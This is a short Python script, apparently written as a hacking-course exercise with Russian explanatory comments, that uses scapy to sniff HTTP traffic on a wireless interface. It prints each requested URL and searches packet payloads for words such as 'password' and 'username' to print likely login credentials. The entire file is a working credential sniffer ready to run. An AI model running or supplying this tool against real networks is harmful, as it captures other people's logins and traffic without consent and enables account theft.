#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = [b"password", b"user", b"username", b"login"]
            for keyword in keywords:
                if keyword in load:
                    return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + str(login_info) + "\n\n")



sniff("wlan0")






# iface - указываем интерфейс который хотим снифить
# store - сообщает  scapy что не\ нужно хранить пакеты в памяти
# prn - устанавливает функцию обратного вызова? колбек



# для уровня raw